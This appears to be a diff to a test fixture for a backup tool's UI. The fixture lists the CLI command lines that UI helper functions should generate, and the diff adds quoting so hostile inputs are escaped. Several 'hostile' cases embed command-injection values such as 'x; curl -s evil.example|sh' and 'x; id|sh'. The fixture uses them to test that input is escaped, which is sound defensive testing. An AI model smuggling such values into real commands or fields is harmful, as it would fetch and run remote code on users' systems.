@@ -3,7 +3,15 @@
   "sources": [
     {
       "path": "ui/shared/src/assurance/assuranceCommands.ts",
-      "sha256": "d1fdc21e51efbf1c69465dab7e150529008f8d0b10938d347ed5a4fa8b45db47"
+      "sha256": "7eb3496f6f563e4e4a148b3b1394a7013156a4bcd9ee8d176a14597eee4f6d65"
+    },
+    {
+      "path": "ui/shared/src/assurance/validatorCommands.ts",
+      "sha256": "f6705fd7ad323cd123ecba27fb6e1370a62356025130388ce67e7d6de17c9c73"
+    },
+    {
+      "path": "ui/shared/src/hooks/runCommands.ts",
+      "sha256": "c2091e80669bdaf8e563bdb46c8e9caa78e0152ce5e8fa03ac9311a576bda69d"
     },
     {
       "path": "ui/shared/src/pages/destinationConfigureCommands.ts",
@@ -11,15 +19,15 @@
     },
     {
       "path": "ui/shared/src/pages/snapshotCommands.ts",
-      "sha256": "9433c99b6059731d02a90cd0794783d38e7cc0fc67f08c8f8947db1494e6f0aa"
+      "sha256": "99731a962bda8ec4334c29998d9d2928731a6b8305057cad56971218c300dc87"
     },
     {
       "path": "ui/shared/src/pages/storageDestinationCommands.ts",
-      "sha256": "b4b8cc32d4a068ec5ac3bde9791d4b404fc677b2f07ff3cbe941e2161cc1b07d"
+      "sha256": "57aaab3929ace71dfe14473c928defd2ca9f0f2f79232fa9286f782c22439fec"
     },
     {
       "path": "ui/shared/src/test/cliTwins.test.ts",
-      "sha256": "5f062dfa1f1532668ef20221d6375a0b6bea54799227e478a7fa34e045cba44a"
+      "sha256": "fe702b86882fde0f26db8f9dd6b85159f06747fda423bd2d8a7685f72836297b"
     }
   ],
   "twins": [
@@ -105,7 +113,7 @@
       "module": "assurance/assuranceCommands",
       "fn": "assuranceShowCommand",
       "case": "an id from a crafted link",
-      "line": "retnd assurance show x; curl -s evil.example|sh"
+      "line": "retnd assurance show 'x; curl -s evil.example|sh'"
     },
     {
       "module": "assurance/assuranceCommands",
@@ -282,6 +290,72 @@
       "line": "retnd backup-set assurance api-server/var-backups --scrub-cadence 1h --recovery-test-mode builtin"
     },
     {
+      "module": "assurance/assuranceCommands",
+      "fn": "recoveryTestArtifactShapeCommand",
+      "case": "the due list's shape",
+      "line": "retnd recovery-test <source/set> --artifact <id>"
+    },
+    {
+      "module": "assurance/assuranceCommands",
+      "fn": "assuranceListCommand",
+      "case": "no argument",
+      "line": "retnd assurance list"
+    },
+    {
+      "module": "assurance/assuranceCommands",
+      "fn": "recoverManyNoTargetCommand",
+      "case": "nothing chosen yet",
+      "line": "retnd recover api-server/var-backups/dump-2026-10-01.tar.gz api-server/var-backups/dump-2026-10-01.tar.gz.2 --to <destination>"
+    },
+    {
+      "module": "assurance/assuranceCommands",
+      "fn": "recoverManyNoTargetCommand",
+      "case": "a hostile file name",
+      "line": "retnd recover 'api-server/x; id|sh/y; id' --to <destination>"
+    },
+    {
+      "module": "assurance/validatorCommands",
+      "fn": "addCommand",
+      "case": "global",
+      "line": "retnd assurance validators add dumps --pattern '\\.sql\\.gz$' --script FILE"
+    },
+    {
+      "module": "assurance/validatorCommands",
+      "fn": "addCommand",
+      "case": "scoped, workflow environment",
+      "line": "retnd assurance validators add manifest --pattern '^MANIFEST-' --backup-set api-server/var-backups --script FILE --env workflow"
+    },
+    {
+      "module": "assurance/validatorCommands",
+      "fn": "addCommand",
+      "case": "nothing typed yet",
+      "line": "retnd assurance validators add NAME --pattern PATTERN --script FILE"
+    },
+    {
+      "module": "assurance/validatorCommands",
+      "fn": "addCommand",
+      "case": "hostile values",
+      "line": "retnd assurance validators add 'x; curl -s evil.example|sh' --pattern 'x; curl -s evil.example|sh' --backup-set 'api-server/x; id|sh' --script FILE"
+    },
+    {
+      "module": "hooks/runCommands",
+      "fn": "runCommand",
+      "case": "every set",
+      "line": "retnd run"
+    },
+    {
+      "module": "hooks/runCommands",
+      "fn": "runCommand",
+      "case": "one set",
+      "line": "retnd fetch --backup-set api-server/var-backups"
+    },
+    {
+      "module": "hooks/runCommands",
+      "fn": "runCommand",
+      "case": "a hostile set id",
+      "line": "retnd fetch --backup-set 'api-server/x; id|sh'"
+    },
+    {
       "module": "pages/destinationConfigureCommands",
       "fn": "configureCommand",
       "case": "a local volume",
@@ -372,6 +446,18 @@
       "line": "retnd retention apply api-server/var-backups --acknowledge"
     },
     {
+      "module": "pages/snapshotCommands",
+      "fn": "snapshotRestoreShapeCommand",
+      "case": "a set",
+      "line": "retnd snapshot restore api-server/var-backups --to <directory>"
+    },
+    {
+      "module": "pages/snapshotCommands",
+      "fn": "snapshotRestoreShapeCommand",
+      "case": "a hostile set id",
+      "line": "retnd snapshot restore 'api-server/x; id|sh' --to <directory>"
+    },
+    {
       "module": "pages/storageDestinationCommands",
       "fn": "importCredentialsCommand",
       "case": "no argument",
@@ -417,7 +503,7 @@
       "module": "pages/storageDestinationCommands",
       "fn": "addCommand",
       "case": "an id still being typed",
-      "line": "retnd medium add x; curl -s evil.example|sh --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback"
+      "line": "retnd medium add 'x; curl -s evil.example|sh' --type s3 --region eu-central-1 --endpoint https://s3.example.test --bucket 'acme backups' --prefix retnd/ --storage-class STANDARD_IA --upload-verification readback"
     },
     {
       "module": "pages/storageDestinationCommands",
@@ -453,7 +539,7 @@
       "module": "pages/storageDestinationCommands",
       "fn": "testConnectionCommand",
       "case": "a hostile id",
-      "line": "retnd medium test-connection x; curl -s evil.example|sh"
+      "line": "retnd medium test-connection 'x; curl -s evil.example|sh'"
     },
     {
       "module": "pages/storageDestinationCommands",
@@ -465,7 +551,7 @@
       "module": "pages/storageDestinationCommands",
       "fn": "setDefaultCommand",
       "case": "a hostile id",
-      "line": "retnd medium default x; curl -s evil.example|sh"
+      "line": "retnd medium default 'x; curl -s evil.example|sh'"
     },
     {
       "module": "pages/storageDestinationCommands",
@@ -483,7 +569,7 @@
       "module": "pages/storageDestinationCommands",
       "fn": "tierMediumCommand",
       "case": "hostile names",
-      "line": "retnd settings patch --tier-medium x; curl -s evil.example|sh=x; curl -s evil.example|sh --acknowledge-medium-disclosure"
+      "line": "retnd settings patch --tier-medium 'x; curl -s evil.example|sh=x; curl -s evil.example|sh' --acknowledge-medium-disclosure"
     },
     {
       "module": "pages/storageDestinationCommands",
@@ -495,7 +581,7 @@
       "module": "pages/storageDestinationCommands",
       "fn": "removeCommand",
       "case": "a hostile id",
-      "line": "retnd medium remove x; curl -s evil.example|sh"
+      "line": "retnd medium remove 'x; curl -s evil.example|sh'"
     },
     {
       "module": "pages/storageDestinationCommands",
@@ -507,7 +593,7 @@
       "module": "pages/storageDestinationCommands",
       "fn": "showCommand",
       "case": "a hostile id",
-      "line": "retnd medium show x; curl -s evil.example|sh"
+      "line": "retnd medium show 'x; curl -s evil.example|sh'"
     }
   ]
 }
